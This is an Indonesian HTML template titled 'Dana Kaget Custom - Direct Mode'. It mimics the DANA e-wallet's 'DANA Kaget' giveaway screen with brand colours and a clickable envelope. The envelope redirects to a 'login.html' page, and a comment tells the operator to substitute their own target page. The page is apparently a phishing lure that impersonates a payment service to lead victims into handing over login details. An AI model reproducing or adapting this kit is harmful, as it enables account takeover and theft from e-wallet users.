<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dana Kaget Custom - Direct Mode</title>
    <style>
        /* Font formal & bersih */
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: Arial, Helvetica, sans-serif; 
        }
        
        body {
            background: linear-gradient(180deg, #108ee9 0%, #0076d2 100%);
            height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            color: white;
            overflow: hidden;
        }

        /* NAVBAR: Logo "Dana Kaget" mepet tombol back */
        .navbar {
            width: 100%;
            height: 60px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 100;
        }

        .btn-back {
            font-size: 22px;
            cursor: pointer;
            margin-right: 10px;
            display: flex;
            align-items: center;
        }

        .nav-logo-text {
            font-size: 19px;
            font-weight: 500;
        }

        /* CONTENT: Posisi Center Presisi */
        .content { 
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 0 20px;
            margin-top: 60px;
        }

        .sub-text { 
            width: 100%;
            font-size: 14px; 
            opacity: 0.9; 
            margin-bottom: 30px; 
            text-align: center;
            display: block;
        }

        /* Amplop Container */
        .custom-envelope {
            position: relative;
            width: 300px;
            cursor: pointer;
            animation: pulse-simple 2s infinite;
            transition: transform 0.2s ease, opacity 0.2s ease;
        }

        /* Efek pas diklik */
        .custom-envelope:active {
            transform: scale(0.9);
            opacity: 0.8;
        }

        .custom-envelope img {
            width: 100%;
            height: auto;
            filter: drop-shadow(0 15px 30px rgba(0,0,0,0.3));
            display: block;
        }

        @keyframes pulse-simple {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <nav class="navbar">
        <div class="btn-back" onclick="history.back()">&lt;</div>
        <div class="nav-logo-text">Dana Kaget</div>
    </nav>

    <main class="content">
        <p class="sub-text">Kamu berpartisipasi di DANA Kaget</p>
        
        <div class="custom-envelope" onclick="redirectToPage()">
            <img src="https://cdn.phototourl.com/free/2026-05-01-b8bbf691-ae21-4763-bf9c-9aa75eb1b093.png" alt="DANA Kaget">
        </div>
    </main>

    <script>
        function redirectToPage() {
            // GANTI URL DI BAWAH INI DENGAN HALAMAN TUJUAN LU BOS
            const targetURL = "login.html";
            
            // Proses redirect
            window.location.href = targetURL;
        }
    </script>

</body>
</html>
